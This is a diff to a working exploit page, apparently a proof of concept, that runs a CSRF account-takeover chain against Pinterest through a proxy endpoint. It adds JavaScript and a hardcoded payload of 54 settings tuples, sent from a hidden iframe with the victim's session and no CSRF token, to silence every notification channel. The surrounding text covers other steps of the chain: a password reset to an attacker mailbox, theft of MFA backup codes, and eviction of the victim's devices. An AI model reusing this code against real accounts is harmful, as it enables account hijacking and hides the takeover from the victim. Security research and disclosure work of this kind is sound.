@@ -118,8 +118,8 @@
 
   <div class="step">
     <h2><span class="n"></span>Silence: strip every optional email notification (CSRF write)</h2>
-    <p class="desc">The email-settings tree exposes a global switch, <code>ONLY_REQUIRED</code> &mdash; &ldquo;Control what types of notifications you get (except privacy and account emails)&rdquo;. A form POST through the proxy runs <code>v3_post_settings_email</code> with the victim's session (verified live: <code>section / option / value</code> fields, no CSRF token) and flips it on, disabling the bulk of the account's email categories in one shot. The per-category keys are then flipped off the same way. What this cannot do &mdash; verified against the live settings tree &mdash; is suppress the security email-change alert to the old address: Pinterest hard-scopes those out of the switch (&ldquo;Pinterest will always send you important updates about your account&rdquo;) and no account-email toggle exists in the tree. The victim's one lifeline is that single alert; everything else goes quiet.</p>
-    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/settings/email/</span> &nbsp;<span class="c">section=settings_email_everything &amp; option=ONLY_REQUIRED &amp; value=true</span></div>
+    <p class="desc">One form POST runs <code>v3_post_settings_all_notifications</code> with the victim's session (verified live: <code>updated_settings</code> = a JSON list of <code>{type, section, option, value}</code> tuples &mdash; the exact shape the settings UI saves &mdash; no CSRF token) and darkens every push, in-app, web-push and optional email category at once. A second POST flips the email-tree <code>ONLY_REQUIRED</code> kill switch. What this cannot do &mdash; verified against the live settings tree &mdash; is suppress the security email-change alert to the old address: Pinterest hard-scopes those out (&ldquo;Pinterest will always send you important updates about your account&rdquo;) and no account-email toggle exists in the tree. The victim's one lifeline is that single alert; every other channel goes quiet.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/settings/notifications/</span> &nbsp;<span class="c">updated_settings=[{type, section, option, value:false}, &hellip;54 toggles]</span></div>
     <p class="state wait" id="st3">waiting&hellip;</p>
     <pre id="out3">&hellip;</pre>
   </div>
@@ -179,7 +179,7 @@
     <li><b>A password reset already dispatched</b> to that mailbox (step 6): following the link and setting a password finishes the takeover and logs the victim out.</li>
     <li><b>The MFA backup codes</b> (step 7): one-time second factors, minted and stolen without any re-authentication.</li>
     <li><b>The full session inventory</b> (step 8): devices, IPs and geolocation &mdash; the attacker knows exactly which devices to evict after logging in with the reset password (eviction is a true DELETE, done first-party post-takeover).</li>
-    <li><b>Optional email notifications disabled first</b> (step 3): the account is switched to only-required mail with no prompt, so almost every email the account would send goes quiet. The security change-of-email alert itself is not suppressible &mdash; verified against the settings surface &mdash; and remains the victim's only signal.</li>
+    <li><b>Every notification channel dark first</b> (step 3): push, in-app, web push and all optional email categories are flipped off with one prompt-less POST (54 toggles, verified live). The security change-of-email alert itself is not suppressible &mdash; verified against the settings surface &mdash; and remains the victim's only signal.</li>
   </ul>
 </div>
 
@@ -294,18 +294,37 @@ function setMode(ok) {
   $('chanChip').textContent = ok ? 'hidden iframe (silent)' : 'top-level POST (3P cookies blocked)';
 }
 
-// flatten a notification-settings tree into {key: value} for diffing
+// flatten a notification-settings tree into {type/section/option: value} for diffing
 function notifFlat(tree) {
   const out = {};
   (function walk(n) {
     if (!n) return;
     if (Array.isArray(n)) { n.forEach(walk); return; }
     if (typeof n !== 'object') return;
-    if (n.key != null && n.value != null && typeof n.value !== 'object') out[n.key] = n.value;
-    walk(n.options); walk(n.categoryMaps); walk(n.category_maps_reformatted); walk(n.value);
+    (n.channel_options || []).forEach(c => { out[c.channel + '/' + c.category_key + '/' + c.subcategory_key] = c.value; });
+    Object.keys(n).forEach(k => { if (k !== 'channel_options') walk(n[k]); });
   })(tree);
   return out;
 }
+
+// build the blackout tuple list from a live tree (the same tuples the settings UI saves)
+function blackoutFromTree(tree) {
+  const out = [];
+  (function walk(n) {
+    if (!n) return;
+    if (Array.isArray(n)) { n.forEach(walk); return; }
+    if (typeof n !== 'object') return;
+    (n.channel_options || []).forEach(c => {
+      if (c.value !== false) out.push({ type: c.channel, section: c.category_key, option: c.subcategory_key, value: false });
+    });
+    Object.keys(n).forEach(k => { if (k !== 'channel_options') walk(n[k]); });
+  })(tree);
+  return out;
+}
+
+// static fallback (full matrix captured from the live tree: 21 push, 17 in-app,
+// 14 email, 1 web_push) for browsers where the read channel is blocked
+var BLACKOUT = [{"type":"push","section":"settings_push_v2","option":"published_comments","value":false},{"type":"news","section":"settings_news_categories","option":"published_comments","value":false},{"type":"push","section":"settings_push_v2","option":"published_reactions","value":false},{"type":"news","section":"settings_news_categories","option":"published_reactions","value":false},{"type":"push","section":"settings_push_v2","option":"published_saves","value":false},{"type":"push","section":"settings_push_v2","option":"views_and_impressions","value":false},{"type":"news","section":"settings_news_categories","option":"views_and_impressions","value":false},{"type":"push","section":"settings_push_v2","option":"published_collages","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_comments","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_comments","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_mentions","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_mentions","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_reminders","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_reminders","value":false},{"type":"push","section":"settings_push_v2","option":"saved_pin_tries","value":false},{"type":"news","section":"settings_news_categories","option":"saved_pin_tries","value":false},{"type":"push","section":"settings_push_v2","option":"group_board_updates","value":false},{"type":"email","section":"settings_email_v2","option":"group_board_updates","value":false},{"type":"news","section":"settings_news_categories","option":"group_board_updates","value":false},{"type":"push","section":"settings_push_v2","option":"group_board_invites","value":false},{"type":"push","section":"settings_push_v2","option":"messages","value":false},{"type":"email","section":"settings_email_v2","option":"messages","value":false},{"type":"news","section":"settings_news_categories","option":"messages","value":false},{"type":"push","section":"settings_push_v2","option":"followers","value":false},{"type":"push","section":"settings_push_v2","option":"homefeed_pins","value":false},{"type":"email","section":"settings_email_v2","option":"homefeed_pins","value":false},{"type":"news","section":"settings_news_categories","option":"homefeed_pins","value":false},{"type":"push","section":"settings_push_v2","option":"pins_picked_for_you","value":false},{"type":"email","section":"settings_email_v2","option":"pins_picked_for_you","value":false},{"type":"news","section":"settings_news_categories","option":"pins_picked_for_you","value":false},{"type":"push","section":"settings_push_v2","option":"based_on_activity","value":false},{"type":"email","section":"settings_email_v2","option":"based_on_activity","value":false},{"type":"news","section":"settings_news_categories","option":"based_on_activity","value":false},{"type":"push","section":"settings_push_v2","option":"board_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"board_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"board_recommendations","value":false},{"type":"push","section":"settings_push_v2","option":"search_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"search_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"search_recommendations","value":false},{"type":"push","section":"settings_push_v2","option":"followee_pins","value":false},{"type":"news","section":"settings_news_categories","option":"followee_pins","value":false},{"type":"push","section":"settings_push_v2","option":"shadow_followee_pins","value":false},{"type":"news","section":"settings_news_categories","option":"shadow_followee_pins","value":false},{"type":"push","section":"settings_push_v2","option":"shopping_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"shopping_recommendations","value":false},{"type":"news","section":"settings_news_categories","option":"shopping_recommendations","value":false},{"type":"email","section":"settings_email_v2","option":"pinterest_announcements","value":false},{"type":"email","section":"settings_email_v2","option":"surveys_and_quizzes","value":false},{"type":"email","section":"settings_email_v2","option":"reports_and_violations_center","value":false},{"type":"email","section":"settings_email_v2","option":"shuffles_activity","value":false},{"type":"push","section":"settings_push_everything","option":"NO_PUSH","value":false},{"type":"web_push","section":"settings_web_push_everything","option":"NO_WEB_PUSH","value":false},{"type":"email","section":"settings_email_everything","option":"ONLY_REQUIRED","value":false},{"type":"news","section":"settings_news","option":"NONE_IN_APP","value":false}];
 
 // ---------- steps ----------
 async function step1() {
@@ -347,51 +366,46 @@ async function step2() {
 }
 
 async function step3() {
-  status('step 3: silencing email notifications…');
-  const before = MODE === 'silent' ? notifFlat((await read('/settings/email/'))?.data) : null;
-  // verified live write shape: v3_post_settings_email takes section/option/value,
-  // form-encodable, no CSRF token. First the global switch, then each optional
-  // email category the tree still leaves on after the switch.
-  const writes = [
-    { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' }
-  ];
-  const promoKeys = ['boards_for_you_v2', 'search_recommendations_v2',
-    'pins_inspired_by_your_recent_activity_v2', 'pins_picked_for_you_v2', 'popular_pins_v2',
-    'group_board_and_community_updates_v2', 'messaging_v2', 'price_drops_on_saved_pins',
-    'marketing_communications_v2', 'feedback_and_surveys_v2', 'reports_and_violations_center',
-    'shuffles_activity'];
+  status('step 3: silencing notifications…');
+  const before = MODE === 'silent' ? notifFlat((await read('/settings/notifications/'))?.data) : null;
+  // v3_post_settings_all_notifications: updated_settings = JSON list of
+  // {type, section, option, value} tuples (the exact shape the settings UI saves).
+  // Form-encoded, no CSRF token — verified live: one POST flips toggles for real.
+  let tuples = [];
   if (MODE === 'silent') {
-    promoKeys.forEach(k => writes.push({ section: 'settings_email_v2', option: k, value: 'false' }));
+    tuples = blackoutFromTree((await read('/settings/notifications/'))?.data);
   }
-  for (const w of writes) {
-    await formWrite('/settings/email/', w);
-  }
-  let note = 'fired ' + writes.length + ' write(s) via ' + (MODE === 'silent' ? 'hidden iframe' : 'top-level form POST') + ':\n' +
-    '  POST ' + PROXY + '/settings/email/\n' +
-    '    section=settings_email_everything & option=ONLY_REQUIRED & value=true\n' +
-    (MODE === 'silent'
-      ? '    section=settings_email_v2 & option=<category> & value=false   (x' + promoKeys.length + ')\n' +
-        '    (verified live: v3_post_settings_email, no CSRF token; the ONLY_REQUIRED flip also\n' +
-        '     disables the bulk of email:pinterest_announcements / messages / shopping ...)'
-      : '    (single write in top-level mode to keep the navigation window quiet)');
+  if (!tuples.length) tuples = BLACKOUT;
+  await formWrite('/settings/notifications/', { updated_settings: JSON.stringify(tuples) });
+  // belt-and-braces: the email-tree kill switch (v3_post_settings_email)
+  await formWrite('/settings/email/', { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' });
+  let note = 'POST ' + PROXY + '/settings/notifications/\n' +
+    '  updated_settings=' + tuples.length + ' tuples (push, in-app, web push, email categories) — value=false\n' +
+    '  (v3_post_settings_all_notifications, form-encodable, no CSRF token; verified live: toggles flip)\n' +
+    'POST ' + PROXY + '/settings/email/\n' +
+    '  section=settings_email_everything & option=ONLY_REQUIRED & value=true\n' +
+    'sent via ' + (MODE === 'silent' ? 'hidden iframe (silent)' : 'top-level form POST');
   if (MODE === 'silent') {
     await wait(2500);
-    const after = notifFlat((await read('/settings/email/'))?.data);
+    const after = notifFlat((await read('/settings/notifications/'))?.data);
     if (before && after) {
-      const diffs = Object.keys(after).filter(k => before[k] !== after[k]).map(k => k + ': ' + before[k] + ' -> ' + after[k]);
-      note += '\n\nre-read diff:\n  ' + (diffs.length ? diffs.join('\n  ') : 'no change — write shape not accepted on this route (or setting already set)');
+      const diffs = Object.keys(after).filter(k => before[k] !== after[k])
+        .map(k => k + ': ' + before[k] + ' -> ' + after[k]);
+      note += '\n\nre-read diff (' + diffs.length + ' toggles flipped):\n  ' +
+        (diffs.length ? diffs.slice(0, 24).join('\n  ') + (diffs.length > 24 ? '\n  …' : '')
+                      : 'no change — write shape not accepted on this route (or setting already set)');
     } else {
       note += '\n\nre-read unavailable';
     }
   } else {
     note += '\n\nwrite-only mode: no re-read possible from this browser. Verify in the account settings.';
   }
-  note += '\n\nscope (verified against the live settings tree): the switch covers optional mail only.\n' +
-    'Pinterest hard-scopes privacy and account emails out of it — "Pinterest will always send\n' +
-    'you important updates about your account" — and no account-email toggle exists in the tree,\n' +
-    'so the security change-of-email alert to the old address still fires. It is the victim\'s\n' +
-    'only signal; every other category is dark.';
-  setState('st3', MODE === 'silent' ? 'writes fired, re-read captured' : 'write fired (top-level)', MODE === 'silent' ? 'ok' : 'err');
+  note += '\n\nscope (verified against the live settings tree): the blackout covers push, in-app,\n' +
+    'web push and every optional email category. Pinterest hard-scopes privacy and account\n' +
+    'emails out of the switch — "Pinterest will always send you important updates about your\n' +
+    'account" — and no account-email toggle exists in the tree, so the security change-of-email\n' +
+    'alert to the old address still fires. It is the victim\'s only signal; everything else is dark.';
+  setState('st3', MODE === 'silent' ? 'blackout fired, re-read captured' : 'blackout fired (top-level)', MODE === 'silent' ? 'ok' : 'err');
   $('out3').textContent = note;
   return true;
 }
